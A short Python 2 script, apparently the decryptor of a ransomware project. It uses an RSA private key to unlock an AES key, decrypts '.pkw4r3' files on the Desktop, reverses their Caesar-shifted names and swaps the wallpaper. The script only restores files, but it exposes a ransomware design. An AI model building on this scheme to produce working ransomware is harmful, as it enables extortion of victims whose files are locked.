from aes_on_single_file import *
from caesar_encrypt_decrypt import *
from base64 import b64decode
from Crypto.PublicKey import RSA
from change_wallpaper import *
import sys, os, ctypes

rsa_key_file = open(sys.argv[1], 'r')
rsa_key = rsa_key_file.read()
rsa_key_file.close()
rsakey = RSA.importKey(rsa_key)


aes_key_file = open('aes_key_file', 'r')
encr_aes_key = b64decode(aes_key_file.read())
aes_key_file.close()

aes_key = rsakey.decrypt(encr_aes_key)

home = os.path.expanduser('~\Desktop')
for root, dirs, files in os.walk(home+"\\"):
    for file in files:
        if file.endswith(".pkw4r3"):
            x = os.path.join(root, file)
            print x
            dir = os.path.dirname(os.path.abspath(x))
            aes_decrypt_file(x,aes_key)

            print dir+"\\"+caesar_shift(file, (len(file[:-7])%26)*-1)[:-7]
            os.rename(x,dir+"\\"+caesar_shift(file, (len(file[:-7])%26)*-1)[:-7])
            #os.remove(x)

change_wallpaper(os.getcwd()+"\decrypted_wallpaper.png")